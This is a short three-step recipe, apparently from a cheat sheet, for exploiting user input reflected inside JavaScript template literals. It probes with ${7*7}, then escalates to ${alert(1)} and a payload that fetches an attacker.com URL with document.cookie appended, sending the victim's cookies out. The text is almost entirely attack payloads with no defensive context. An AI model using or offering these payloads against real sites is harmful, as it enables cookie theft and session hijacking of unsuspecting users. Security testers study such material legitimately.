1. Find input reflected inside JS template literals (backtick strings).
2. Inject ${7*7} — if 49 appears in output → template eval confirmed.
3. Escalate: ${alert(1)}, ${fetch('https://attacker.com/?c='+document.cookie)}
